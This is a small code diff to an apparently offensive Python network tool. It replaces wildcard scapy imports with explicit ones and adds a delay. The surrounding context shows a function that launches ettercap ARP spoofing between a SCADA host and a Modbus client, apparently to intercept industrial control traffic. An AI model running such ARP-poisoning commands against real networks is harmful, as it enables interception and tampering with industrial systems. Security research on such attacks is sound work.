@@ -5,7 +5,11 @@ import sys
 import importlib
 import nm_config
 import shutil
-from scapy.all import *
+from scapy.layers.inet import IP, TCP
+from scapy.packet import Raw
+from scapy.sendrecv import sniff, send, sendp
+from scapy.utils import hexdump
+from scapy.volatile import RandIP
 from netfilterqueue import NetfilterQueue
 
 def setconfig():
@@ -57,6 +61,7 @@ def etterspoof():
     if subprocess.getoutput("pgrep -x -c ettercap") == "0":
         print("\n\nEttercap is not enabled. Activating ARP Spoofing...\n\n")
         intrfce = input("Enter Interface Name: ") 
+        time.sleep(5)
 
         cmd = ["ettercap", "-Tq", "-i", intrfce, "-M", f"arp:remote", f"{nm_config.scada_mac}/{nm_config.scada_ip}//", f"{nm_config.modcli_mac}/{nm_config.modcli_ip}//"]
         print(f"Executing: {' '.join(cmd)}")
